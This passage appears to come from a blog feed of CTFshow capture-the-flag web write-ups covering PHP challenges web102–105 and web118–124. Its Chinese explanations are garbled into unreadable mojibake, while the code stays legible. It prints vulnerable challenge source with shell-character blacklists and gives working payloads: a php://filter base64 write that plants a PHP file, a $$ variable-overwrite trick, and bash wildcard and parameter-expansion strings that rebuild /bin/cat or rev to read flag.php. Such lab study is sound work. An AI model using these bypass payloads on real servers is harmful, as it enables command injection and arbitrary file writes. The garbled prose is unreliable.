ä¸¤ä¸ªå­—ç¬¦11ï¼Œv3ä½¿ç”¨ä¼ªåè®®æ‰§è¡Œ<br>GETï¼š<code>?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.php</code><br>POSTä¼ å…¥bin2hexçš„åå‡½æ•°ï¼š<code>v1=hex2bin</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684232663181-750fae44-4eff-4924-a3bd-20e706bf442d.png" alt="image.png"></p><h1 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åŒä¸Šé¢˜payload</p><h1 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>getï¼Œpostå…¨ä¼ å…¥1å³å¯ï¼Œæˆ–è€…ä¼ å…¥æ•°ç»„<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684233072751-3de90d66-58b6-48e9-884b-c57c50fb0185.png" alt="image.png"></p><h1 id="web105-a-å˜é‡è¦†ç›–"><a href="#web105-a-å˜é‡è¦†ç›–" class="headerlink" title="web105 $$a å˜é‡è¦†ç›–"></a>web105 $$a å˜é‡è¦†ç›–</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br></pre></td></tr></table></figure><p>æ¯”èµ›ä¹‹å‰é‡åˆ°å¥½å¤šæ¬¡è¿™ç§é¢˜äº†ï¼Œä½†æ˜¯çœ‹äº†wpä¹Ÿæ²¡æœ‰å¾ˆå¥½çš„å­¦æ˜ç™½ï¼Œçœ‹åˆ°äº†ä¸€ä»½wpé‡Œé¢è®²çš„å¾ˆæ¸…æ¥šã€‚<br>é‡‡ç”¨ä¸­é—´å˜é‡æ¥è§£å†³ï¼š<br><code>error=a=flag</code><br>GETä¸­errorä¸èƒ½åœ¨ç­‰å·å·¦è¾¹ã€‚<br>POSTä¸­flagä¸èƒ½åœ¨ç­‰å·å³è¾¹ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684234987314-7d5c585a-f312-477d-8007-4a4571cdfee2.png" alt="image.png"><br>GETï¼š<code>a=flag</code><br>POSTï¼š<code>error=a</code><br>è¿™æ ·å°±è¾¾æˆäº†ä¸€ç§æƒ…å†µï¼š<br>é¦–å…ˆè¦çŸ¥é“ä¼ å…¥çš„å€¼æ˜¯æ–‡æœ¬ï¼Œ<code>$$key=$$value</code>è¾¾æˆäº†<code>$a=$flag</code>ï¼ŒååŠæ®µåŒç†ï¼Œ<code>$error=$a</code>è¿™æ ·å°±è¾¾æˆäº†å€¼æ¡¥æ¥ã€‚è¿™æ ·æ–‡æœ«çš„åˆ¤æ–­æ‰ä¼šåˆ¤æ–­ä¸ºæ­£ã€‚<br>çœ‹äº†ä¸€çœ¼wpå‘ç°ä¸€ä¸ªæ›´ç‰›çš„åšæ³•ï¼Œç›´æ¥getä¼ å…¥ï¼š<br><code>?suces=flag&amp;flag=</code><br>è¿™å°±æ˜¯æ„é€ çš„<code>suces=flag=ç©º</code><br>åé¢çš„é»˜è®¤ä¼ å…¥flagå°±æ˜¯ç©ºå¯¹åº”åˆ°flagã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web118-web122+web124å‘½ä»¤æ‰§è¡Œç¯‡ï¼ˆå››ï¼‰</title>
      <link href="/2023/04/13/web118-web122-web124%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E5%9B%9B%EF%BC%89-md/"/>
      <url>/2023/04/13/web118-web122-web124%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E5%9B%9B%EF%BC%89-md/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://blog.csdn.net/weixin_46081055/article/details/121721209">https://blog.csdn.net/weixin_46081055/article/details/121721209</a></p></blockquote><h1 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h1><p>é¢˜ç›®é‡Œé¢æç¤ºäº†ï¼š<code>flag in flag.php</code><br>éšä¾¿æäº¤ä¸€ç‚¹ä¸œè¥¿ï¼Œçœ‹åˆ°æºä»£ç ä¸­ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681292185940-62d08e5c-aa0a-41fd-99f7-c0d5ba3983e7.png" alt="image.png"><br>postä¸Šä¼ ç„¶åsystemæ‰§è¡Œï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ã€‚<br>ä½†æ˜¯è¾“å…¥ä¼šå‡ºç°evil inputï¼Œå› æ­¤æƒ³åˆ°å¯èƒ½æ˜¯æœ‰è¿‡æ»¤ã€‚<br>fuzzä¸€ä¸‹ï¼š<br>å‘ç°æœ‰çš„å­—ç¬¦è¢«è¿‡æ»¤æ‰äº†ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681292787888-6d27b5da-8902-4aae-8a8e-9f2a0bcbd28d.png" alt="image.png"><br>å‰©ä½™çš„å­—ç¬¦æœ‰<code>A-Z</code>ï¼Œ<code>;:&#123;&#125;?#$_,@~</code><br>çœ‹äº†wpå­¦äº†ä¸€ä¸ªæ–°å§¿åŠ¿ï¼šä»¥ä¸‹æ˜¯åœ¨æœ¬åœ°æµ‹è¯•çš„ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681293462939-5380ccaf-846d-4c6b-8101-368008933c8a.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681293528467-e3e58553-e477-4503-9732-83c32cda2250.png" alt="image.png"><br>æˆ‘ä»¬åˆ°webæµ‹è¯•ä¸€ä¸‹ï¼š<br>webä¸Šçš„ç”¨æˆ·åæœ«å°¾ä¸ºlï¼Œpathæœ«å°¾ä¸ºnï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•ç»„åˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;<span class="variable">$IFS</span>????.???</span><br></pre></td></tr></table></figure><p>ç»„åˆæˆä¸ºnlæŸ¥æ‰¾æ–‡ä»¶ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681294107237-9cb838b1-54a0-4bcf-8595-27aff96f8054.png" alt="image.png"><br>å½“ç„¶ä¹Ÿæœ‰ä½¿ç”¨åˆ«çš„å­—æ®µçš„æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SHLVLæ˜¯è®°å½•å¤šä¸ª Bash è¿›ç¨‹å®ä¾‹åµŒå¥—æ·±åº¦çš„ç´¯åŠ å™¨,è¿›ç¨‹ç¬¬ä¸€æ¬¡æ‰“å¼€shellæ—¶$&#123;SHLVL&#125;=1ï¼Œç„¶ååœ¨æ­¤shellä¸­å†æ‰“å¼€ä¸€ä¸ªshellæ—¶$&#123;SHLVL&#125;=2ã€‚</span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;å°±è¾“å‡º/</span><br><span class="line"></span><br><span class="line">$&#123;#&#125;æ˜¯0ï¼Œ$&#123;SHLVL&#125;ä¸º1</span><br><span class="line">$&#123;#PWD&#125;æ˜¯å›æ˜¾å­—ç¬¦æ•°ï¼Œ$&#123;PWD&#125; æ˜¯/rootï¼Œ$&#123;#PWD&#125;æ˜¯5</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#$&#123;RANDOM&#125;æ˜¯éšæœºæ•°ï¼Œ$&#123;#RANDOM&#125;ä¸€èˆ¬æ˜¯5ï¼Œä¹Ÿå¯èƒ½æ˜¯4</span><br><span class="line">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span><br><span class="line"></span><br><span class="line">#å…¶ä»–å¸ˆå‚…</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PATH:$&#123;#TERM&#125;:$&#123;SHLVL:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure><h1 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h1><p>è¿™é“é¢˜æŠŠ<code>$&#123;PATH&#125;</code>ç»™ç¦ç”¨äº†ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦æƒ³å‡ºå…¶ä»–è§£æ³•ã€‚<br>payloadï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;<span class="built_in">PWD</span>:<span class="variable">$</span>&#123;<span class="comment">#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span></span><br><span class="line"><span class="comment"># pwd=/var/www/html</span></span><br><span class="line"><span class="comment"># USER=www-data</span></span><br><span class="line"><span class="comment"># payloadå³ä¸º /???/?at ????.???</span></span><br><span class="line">ä¸ºäº†æ„é€ /bin/<span class="built_in">cat</span> </span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681311550803-b62629a3-be2a-45fa-b3ff-1969672a8348.png" alt="image.png"><br>ä¹Ÿå¯ä»¥åªè¦aè¿›è¡Œæ„é€ </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;<span class="built_in">PWD</span>::<span class="variable">$</span>&#123;<span class="comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span></span><br><span class="line">/???/?a? ????.???</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªæŸ¥çœ‹çš„æ—¶å€™éƒ½éœ€è¦æ‰“å¼€f12æŸ¥çœ‹ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681311675416-57a9681f-d78b-491f-bc98-44afa1576ad2.png" alt="image.png"></p><h1 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h1><p>fuzzä¸€ä¸‹çœ‹çœ‹å‰©ä½™ä»€ä¹ˆå¯ç”¨å­—ç¬¦ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">//fuzzä¸€ä¸‹çœ‹çœ‹å‰©ä½™ä»€ä¹ˆå­—ç¬¦</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">33</span>; <span class="variable">$i</span> &lt;= <span class="number">126</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681312167771-8de604f0-ffaf-4aa5-850f-4e1bef1d02dc.png" alt="image.png"><br>å‰©ä½™ï¼š<code>#$.:;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;~</code><br>é€šè¿‡è§‚å¯Ÿï¼Œåº”è¯¥æ˜¯è¿˜æ˜¯ç”¨ä¸Šä¸€é“é¢˜ç±»ä¼¼çš„æ–¹æ³•ã€‚ä½†æ˜¯è¿™æ¬¡è¿‡æ»¤äº†PATH|BASH|HOMEä¸‰ä¸ªå­—æ®µã€‚<br>æ‰€ä»¥æ„å»ºpayloadï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;<span class="built_in">PWD</span>::<span class="variable">$</span>&#123;<span class="comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span></span><br><span class="line">/???/?a? ????.???</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681312602829-4b269e50-195a-4a00-a726-94d2b1eda48c.png" alt="image.png"></p><h1 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;</span>|\<span class="string">&quot;|\`|\||\,/&#x27;, <span class="variable">$code</span>))&#123;    </span></span><br><span class="line"><span class="string">        if(strlen(<span class="variable">$code</span>)&gt;65)&#123;</span></span><br><span class="line"><span class="string">            echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        else&#123;</span></span><br><span class="line"><span class="string">        echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;&#x27;.system(<span class="variable">$code</span>).&#x27;&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else&#123;</span></span><br><span class="line"><span class="string">     echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;evil input&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¯”ä¸Šä¸€é¢˜è¿‡æ»¤æ›´åŠ ä¸¥å¯†ï¼ŒæŠŠ<code>FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME</code>éƒ½è¿‡æ»¤æ‰äº†ã€‚<br>å¥½åƒæŠŠ<code>$&#123;PWD&#125;</code>ç•™ä¸‹äº†ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="variable">$</span>&#123;<span class="built_in">PWD</span>::<span class="variable">$</span>&#123;<span class="comment">#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???</span></span><br><span class="line"></span><br><span class="line">/???/<span class="built_in">r</span>?? ????.???</span><br><span class="line">/bin/rev</span><br></pre></td></tr></table></figure><p><code>$&#123;?&#125;=0ï¼Œ$&#123;#?&#125;=1</code>ä¸­(<code>$?</code>æ˜¯è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681313098244-77c8ab4a-3462-446c-a5e6-dda6f36c5048.png" alt="image.png"><br>åœ¨æœ¬åœ°è°ƒè½¬ä¸€ä¸‹å³å¯ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681313310818-b3f49950-e3bc-4b9b-bdad-3b3494168abb.png" alt="image.png"></p><h2 id="å’Œ"><a href="#å’Œ" class="headerlink" title="${?}å’Œ$?"></a>${?}å’Œ$?</h2><blockquote><p><a href="https://www.cnblogs.com/chengd/p/7803664.html">https://www.cnblogs.com/chengd/p/7803664.html</a></p></blockquote><h1 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;</span>|\<span class="string">&quot;|\`|\||\,/&#x27;, <span class="variable">$code</span>))&#123;    </span></span><br><span class="line"><span class="string">        if(strlen(<span class="variable">$code</span>)&gt;65)&#123;</span></span><br><span class="line"><span class="string">            echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        else&#123;</span></span><br><span class="line"><span class="string">        echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;&#x27;.system(<span class="variable">$code</span>).&#x27;&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else&#123;</span></span><br><span class="line"><span class="string">     echo &#x27;&lt;div align=&quot;</span>center<span class="string">&quot;&gt;evil input&lt;/div&gt;&#x27;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>PWDè¿™å›ä¹Ÿæ²¡äº†ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&lt;A;<span class="variable">$</span>&#123;HOME::<span class="variable">$</span>?&#125;???<span class="variable">$</span>&#123;HOME::<span class="variable">$</span>?&#125;?????<span class="variable">$</span>&#123;RANDOM::<span class="variable">$</span>?&#125; ????.???</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬æƒ…å†µä¸‹<code>#RANDOM</code>è¿”å›çš„å€¼ä¸º4æˆ–5.<br>å› æ­¤è¿™ä¸ªæ˜¯æ¦‚ç‡è§¦å‘ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681314039095-ad8c4a2b-4193-4cb8-9cb9-ec532b413d90.png" alt="image.png"><br>base64è§£å¯†ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681314066321-4698fa50-eab6-4ff7-acd7-da64bee136ac.png" alt="image.png"><br>åœ¨æœ«å°¾è¡¥ä¸€ä¸ª<code>&#125;</code>å³å¯ã€‚</p><h1 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: æ”¶é›†è‡ªç½‘ç»œ</span></span><br><span class="line"><span class="comment"># @Date:   2020-09-16 